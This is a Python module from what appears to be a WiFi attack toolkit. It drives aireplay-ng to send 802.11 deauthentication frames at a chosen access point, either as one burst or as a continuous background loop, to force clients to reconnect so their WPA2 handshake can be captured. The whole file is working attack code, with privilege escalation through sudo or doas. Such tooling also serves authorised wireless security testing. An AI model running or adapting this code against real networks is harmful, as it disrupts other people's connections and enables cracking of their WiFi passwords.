"""
core/deauth.py
Sends IEEE 802.11 deauthentication frames to force clients to
reconnect to their access point, triggering a new WPA2 handshake.

What is a deauth attack?
A deauthentication frame is a standard part of the 802.11 WiFi protocol.
It is sent by an AP to disconnect a client. aireplay-ng spoofs these
frames, causing connected clients to briefly disconnect and reconnect —
which produces the WPA2 handshake we need to capture.

Two modes:
- Single burst: Send N deauth packets once
- Continuous:   Keep sending until stopped (used alongside capture)
"""

import subprocess
import threading
import time
import platform
from utils.logger import logger
from utils.validator import validate_device, validate_bssid, validate_packet_count
from utils.commands import build_privileged_cmd, command_exists


class DeauthAttack:
    """Sends deauthentication frames to a target access point."""

    def __init__(self):
        self.system = platform.system()
        self._stop_event = threading.Event()

    def send_deauth(self, device, bssid, packet_count, log_callback):
        """
        Send a fixed number of deauth packets to the target BSSID.

        Args:
            device:       Wireless interface in monitor mode
            bssid:        Target AP MAC address
            packet_count: Number of deauth frames to send
            log_callback: Function to display status messages
        """
        if self.system != 'Linux':
            log_callback("Deauth attacks are only supported on Linux.")
            return

        if not command_exists('aireplay-ng'):
            log_callback("aireplay-ng not found. Install aircrack-ng package.")
            return

        if not validate_device(device): return
        if not validate_bssid(bssid):   return
        if not validate_packet_count(packet_count): return

        try:
            deauth_cmd = build_privileged_cmd(
                ['aireplay-ng', '--deauth', packet_count, '-a', bssid, device]
            )
            if not deauth_cmd:
                log_callback("No privilege escalation tool found (sudo/doas).")
                return

            subprocess.Popen(
                deauth_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            log_callback(f"Sent {packet_count} deauth packets to {bssid}")
            logger.info(f"Deauth: sent {packet_count} packets to {bssid}")
        except Exception as e:
            log_callback(f"Error sending deauth: {e}")
            logger.error(f"Deauth error: {e}")

    def start_continuous_deauth(self, device, bssid, log_callback):
        """
        Start a continuous deauth loop in a background thread.
        Sends 5 packets every 2 seconds until stop_continuous_deauth() is called.

        Args:
            device:       Wireless interface in monitor mode
            bssid:        Target AP MAC address
            log_callback: Function to display status messages
        """
        if self.system != 'Linux':
            log_callback("Deauth attacks are only supported on Linux.")
            return

        if not command_exists('aireplay-ng'):
            log_callback("aireplay-ng not found. Install aircrack-ng package.")
            return

        if not validate_device(device): return
        if not validate_bssid(bssid):   return

        self._stop_event.clear()

        def deauth_loop():
            while not self._stop_event.is_set():
                try:
                    loop_cmd = build_privileged_cmd(
                        ['aireplay-ng', '--deauth', '5', '-a', bssid, device]
                    )
                    if not loop_cmd:
                        log_callback("No privilege escalation tool found (sudo/doas).")
                        return

                    subprocess.run(
                        loop_cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=2
                    )
                    time.sleep(2)
                except Exception as e:
                    log_callback(f"Deauth loop error: {e}")

        threading.Thread(target=deauth_loop, daemon=True).start()
        log_callback(f"Continuous deauth started on {bssid}")
        logger.info(f"Continuous deauth started on {bssid}")

    def stop_continuous_deauth(self, log_callback):
        """Stop the continuous deauth loop."""
        self._stop_event.set()
        log_callback("Continuous deauth stopped.")
        logger.info("Continuous deauth stopped.")
